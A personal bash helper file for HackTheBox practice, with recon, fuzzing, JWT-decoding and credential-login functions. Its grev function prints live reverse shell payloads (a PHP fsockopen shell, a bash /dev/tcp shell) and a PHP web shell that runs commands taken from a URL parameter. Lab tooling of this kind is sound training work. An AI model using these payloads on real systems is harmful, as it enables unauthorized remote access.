#!/bin/bash

alias gports="xmlstarlet sel -t -v '//port[state/@state=\"open\"]/@portid' -nl open | paste -s -d, -"

# Returns different types of reverse shells
function grev() {
	# Switch case for reverse shell type
	case $1 in
	"php")
    echo "<?php \$sock=fsockopen(\"$(gtunip)\",1233);shell_exec(\"sh <&3 >&3 2>&3\");?>"
		;;
	"rce-php")
		echo "<?php echo '<pre>' . shell_exec(\$_GET['cmd']) . '</pre>'; ?>"
		;;
	"blind")
		echo "(sh)0>/dev/tcp/$(gtunip)/1233"
		;;
	"bash")
		# Fallback to bash reverse shell
		echo "bash -c 'bash -i >& /dev/tcp/$(gtunip)/1233 0>&1'"
		;;
	*)
		# Show all reverse shells available, in a colorful way
		which grev | grep -E '")' | grep -v 'show' | while read line; do
			title=$(awk -F '"' '{print $2}' <<< $line)
			content=$(grev $title)
			echo -e "\e[1;32m$title\e[0m - $content"
		done
		;;
	esac

}

# Executes a recon on the target ip
function recon() {
	# Checks that $tip is setted
	if [[ -z $tip ]]; then
		echo "Target IP not setted"
		return 1
	fi

	# Does initial scan
	sudo nmap -sS --min-rate 5000 -p- --open -n -Pn $tip -vvv -oX open &&

		# Does deeper scan
		sudo nmap -sCV -p$(gports) -Pn -oN details $tip -vvv

	# Creates the initial writeup.md file
	writeup="# Ports"
	for port in $(gports | tr ',' '\n'); do
		item="**$port** -"
		item="$item *$(grep "$port/" details | awk '{print $(NF - 2)}')*"
		item="$item (v$(grep "$port/" details | awk '{print $(NF - 1)}'))"

		writeup="$writeup\n$item"
	done
	echo "$writeup" >>../writeup.md
}

# Creates a new folder for a hackthebox machine
function htbc() {
	#Variables
	machine_name="$1"
	machine_lowername="$(echo $1 | awk '{print tolower($0)}')"
	machine_ip="$2"

	#Creating machine directories
	mkdir "/home/js/hacking/hackthebox/machines/$machine_lowername"
	\cd "$_" || exit
	mkdir recon content exploit recon/wfuzz

	#Creating obsidian writeup and symlink
	touch writeup.md
	ln -s "$(pwd)/writeup.md" "/home/js/documents/obsidian/Hacking/Machines/HackTheBox - $machine_name.md"

	#Cd into recon and updating target ip
	cd recon || exit
	upvar tip "$machine_ip"
	upvar starting_path "$(pwd)"
}

function guser(){ guserpass "$1" | column 1 ':'; }

function gpass(){ guserpass "$1" | column 2 ':'; }

function guserpass() {
	# Read the credentials from the file
	local creds_file="creds"
	local creds_line
  
  # Check if an line_number has been provided
  if [ -n "$1" ]; then
    line_number="$1"
  else
    line_number=1
  fi
  
	if [[ -f "$creds_file" ]]; then
		creds_line=$(head -n $line_number "$creds_file" | tail -n1)
	else
		echo "Credentials file not found."
		return 1
	fi

	# Extract the username and password from the credentials line
	local username=${creds_line%%:*}
	local password=${creds_line#*:}
  echo -ne "$username:$password"
}

# Logs in by ssh to the target ip address using a credentials file (user:pass)
function winrmcreds() {
  username=$(guser "$@")
  password=$(gpass "$@")
  
	local ip=$2
	# Check if an IP address is provided
	if [[ -z $2 ]]; then
		echo "IP address not provided, using target ($tip)"
		local ip="$tip"
	fi

	# Form the SSH command
	shift
	local winrm_command="evil-winrm -u '$username' -p '$password' $tip"

	# Execute the SSH command
	echo "Logging in to $username@$ip..."
	bash -c "$ssh_command"
}

# Logs in by ssh to the target ip address using a credentials file (user:pass)
function sshcreds() {
  username=$(guser "$@")
  password=$(gpass "$@")
  
	local ip=$2
	# Check if an IP address is provided
	if [[ -z $2 ]]; then
		echo "IP address not provided, using target ($tip)"
		local ip="$tip"
	fi

	# Form the SSH command
	shift
	local ssh_command="sshpass -p '$password' ssh -o StrictHostKeyChecking=no $username@$ip $@"

	# Execute the SSH command
	echo "Logging in to $username@$ip..."
	bash -c "$ssh_command"
}

decode_base64_url() {
	local len=$((${#1} % 4))
	local result="$1"
	if [ $len -eq 2 ]; then
		result="$1"'=='
	elif [ $len -eq 3 ]; then
		result="$1"'='
	fi
	echo "$result" | tr '_-' '/+' | openssl enc -d -base64
}

decode_jwt() {
	decode_base64_url $(echo -n $2 | cut -d "." -f $1) | jq .
}

superfuzz() {
	function usage(){
			echo "Usage: $0 [-h] [-d] [-e] <url>"
			echo "Default: $0 -dve txt,json,yaml -o fuzz.txt <url>"
			echo "Options:"
			echo "  -h  Show this help message and exit"
			echo "  -d  Fuzz directories"
			echo "  -v  Fuzz virtual hosts"
			echo "  -o  Output file"
			echo "  -e  Extensions to fuzz (comma separated)"
	}
	# If no arguments are provided, use the default ones
	if [[ $# -eq 0 ]]; then
		dirs=true
		vhosts=true
		extensions="txt,json,yaml"
		output="fuzz.txt"
	fi

	while getopts ":hvde:o:" opt; do
		case $opt in
		h)
			usage
			return 0
			;;
		v)
			vhosts=true
			;;
		d)
			dirs=true
			;;
		e)
			extensions="$OPTARG"
			;;
		o)
			output="$OPTARG"
			;;
		\?)
			echo "Invalid option: -$OPTARG" >&2
			usage
			return 1
			;;
		:)
			echo "Option -$OPTARG requires an argument." >&2
			return 1
			;;
		esac
	done


	# Fuzz directories
	if [[ $dirs == true ]]; then
		echo "[+] Fuzzing directories..."
		ffuf -w $dirlist -u "$tip/FUZZ" -o "$output" -of html -t 200 -c -v
	fi
}

addhost() {
    # Check if $tip and $1 are set
    if [ -z "$tip" ]; then
        echo "Error: \$tip environment variable is not set."
        return 1
    fi

    if [ -z "$1" ]; then
        echo "Error: No hostname provided."
        return 1
    fi

    # Assign hostname to a variable
    hostname=$1

    if grep -q "$hostname" /etc/hosts; then
        echo "The hostname $hostname already exists in /etc/hosts."
        return 0
    fi

    # Check if the IP address already exists in /etc/hosts
    if grep -q "$tip" /etc/hosts; then
        # Append the hostname to the existing line with the same IP address
        sudo sed -i "/$tip/s/$/ $hostname/" /etc/hosts
        echo "Added $hostname to the existing $tip entry in /etc/hosts."
    else
        # Add the new entry to /etc/hosts
        echo "$tip    $hostname" | sudo tee -a /etc/hosts > /dev/null
        echo "Added $hostname to /etc/hosts."
    fi
}

# Decode JWT header
alias jwth="decode_jwt 1"

# Decode JWT Payload
alias jwtp="decode_jwt 2"

alias sd="show_dicts"

### Variables
# Dicts
export vhlist='/usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt'
export dirlist='/usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt'
export rockyou='/home/js/hacking/wordlists/rockyou-utf-8.txt'
export userlist='/home/js/hacking/wordlists/SecLists/Usernames/xato-net-10-million-usernames-dup.txt'
export lfi_payloads='/home/js/hacking/wordlists/lfi_payloads.txt'
export lfi_files='/home/js/hacking/wordlists/lfi-files.txt'
export dotdotpwn='/home/js/hacking/wordlists/dotdotpwn.txt'
export secrets='/home/js/hacking/wordlists/jwt.secrets.list'
export nginx='/home/js/hacking/wordlists/nginx.txt'
export springboot='/home/js/hacking/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt'
export names='/home/js/hacking/wordlists/SecLists/Usernames/Names/names.txt'
export iis='/home/js/hacking/wordlists/iisfinal.txt'
export common='/usr/share/SecLists/Discovery/Web-Content/common.txt'
export big='/home/js/hacking/wordlists/wfuzz/general/big.txt'
# /Dicts
